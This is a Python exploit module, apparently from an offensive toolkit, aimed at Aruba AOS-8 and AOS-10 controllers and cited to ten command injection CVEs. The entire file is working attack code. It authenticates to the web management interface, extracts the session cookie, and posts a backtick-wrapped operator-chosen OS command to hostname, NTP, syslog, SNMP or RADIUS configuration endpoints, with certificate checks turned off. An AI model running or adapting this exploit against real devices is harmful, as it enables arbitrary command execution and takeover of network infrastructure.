# Author: André Henrique (LinkedIn/X: @mrhenrike)
import ssl
import time
import urllib.error
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Aruba AOS-8/AOS-10 Authenticated Command Injection Batch (CVE-2026-44865..44874).

    Multiple authenticated command injection vulnerabilities exist in the
    web management and CLI interfaces of AOS-8 and AOS-10.  An
    authenticated attacker with operator or read-only privileges can
    inject arbitrary OS commands through improperly sanitized input fields
    in the web UI configuration pages and CLI parameters.  This batch
    covers ten CVEs (CVE-2026-44865 through CVE-2026-44874), each
    affecting a different configuration endpoint.

    CVSS v3.1: 7.2 (High), AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Aruba AOS Auth Command Injection Batch (CVE-2026-44865..44874)",
        "description": (
            "Exploits CVE-2026-44865 through CVE-2026-44874, ten authenticated "
            "command injection flaws in AOS-8 and AOS-10 web/CLI interfaces.  "
            "An operator-level user can inject OS commands via configuration "
            "parameters that are passed unsanitized to system() calls."
        ),
        "authors": (
            "HPE Aruba Security Advisory",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-44865",
            "https://www.arubanetworks.com/assets/alert/",
        ),
        "disclosure_date": "2026-09-10",
        "platform": "aruba_aos",
        "arch": "all",
        "privileged": True,
        "targets": (
            "AOS-8 before 8.12.0.6",
            "AOS-10 before 10.6.0.5",
        ),
    }

    target = OptIP("", "Target AP/Controller management IP")
    port = OptPort(4343, "HTTPS management port")
    timeout = OptFloat(5.0, "HTTP request timeout")
    username = OptString("operator", "Authenticated username (operator level)")
    password = OptString("", "Password for authentication")
    command = OptString("id", "OS command to inject")
    injection_vector = OptInteger(
        1,
        "Injection vector (1=hostname, 2=ntp_server, 3=syslog_server, "
        "4=snmp_community, 5=radius_server)",
    )

    _LOGIN_PATH = "/screens/wms/wms.login"
    _API_BASE = "/rest/v1/configuration/object"

    _INJECTION_ENDPOINTS = {
        1: ("/hostname", "hostname"),
        2: ("/ntp_server", "server"),
        3: ("/syslog_server", "server"),
        4: ("/snmp_community", "community"),
        5: ("/radius_server", "host"),
    }

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _https_request(
        self, method: str, path: str,
        headers: dict | None = None,
        body: bytes | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "WirelessXPL-Forge/2.2")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    def _authenticate(self) -> str | None:
        """Authenticate and return session cookie."""
        body = (
            f"opcode=login&url=/&username="
            f"{urllib.request.quote(str(self.username))}"
            f"&password={urllib.request.quote(str(self.password))}"
        ).encode()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        status, resp = self._https_request("POST", self._LOGIN_PATH, headers, body)
        if status in (200, 302):
            decoded = resp.decode("utf-8", errors="replace")
            import re
            match = re.search(r'SESSION=([^;"]+)', decoded)
            if match:
                return match.group(1)
        return None

    @mute
    def check(self) -> bool:
        """Check if the Aruba web management interface is accessible."""
        status, _ = self._https_request("GET", self._LOGIN_PATH)
        return status in (200, 301, 302)

    def run(self) -> None:
        if not self.target:
            print_error("target is required")
            return

        if not self.check():
            print_error(f"Cannot reach Aruba web UI at {self.target}:{self.port}")
            return

        print_success("Aruba AOS web UI detected; attempting authenticated cmd injection")
        self._exploit()

    def _exploit(self) -> None:
        vec = int(self.injection_vector)
        if vec not in self._INJECTION_ENDPOINTS:
            print_error(f"Invalid injection_vector: {vec}. Use 1-5.")
            return

        endpoint, param_name = self._INJECTION_ENDPOINTS[vec]
        injected_value = f'test`{self.command}`'

        print_status(f"Vector {vec}: {endpoint} (parameter: {param_name})")
        print_status(f"Command: {self.command}")

        session = self._authenticate()
        if not session:
            print_error("Authentication failed; check credentials.")
            return

        print_status("Authenticated; injecting command")

        import json
        payload = json.dumps({param_name: injected_value}).encode()
        headers = {
            "Cookie": f"SESSION={session}",
            "Content-Type": "application/json",
        }

        status, body = self._https_request(
            "POST", self._API_BASE + endpoint, headers, payload,
        )

        if status in (200, 201, 204):
            print_success(
                f"Configuration accepted (HTTP {status}). If the target "
                "is vulnerable, the backtick-injected command executed "
                "during configuration processing."
            )
        elif status == 403:
            print_error("Insufficient privileges for this configuration endpoint.")
        else:
            print_info(f"Response: HTTP {status}")
